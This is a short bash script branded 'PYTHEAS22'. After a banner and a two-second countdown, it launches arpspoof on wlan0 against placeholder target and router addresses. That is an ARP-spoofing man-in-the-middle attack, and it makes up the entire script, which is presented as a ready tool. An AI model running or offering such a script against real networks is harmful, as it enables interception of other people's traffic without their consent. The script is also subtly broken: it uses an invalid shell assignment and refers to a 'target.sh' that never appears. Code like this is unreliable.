#!/bin/bash
echo "THANK YOU FOR USING PYTHEAS22"
echo '"target.sh" WILL BE EXECUTED IN 2 SECONDS'
sleep 2
arp = $(arpspoof -i wlan0 -t target_ip router_ip)
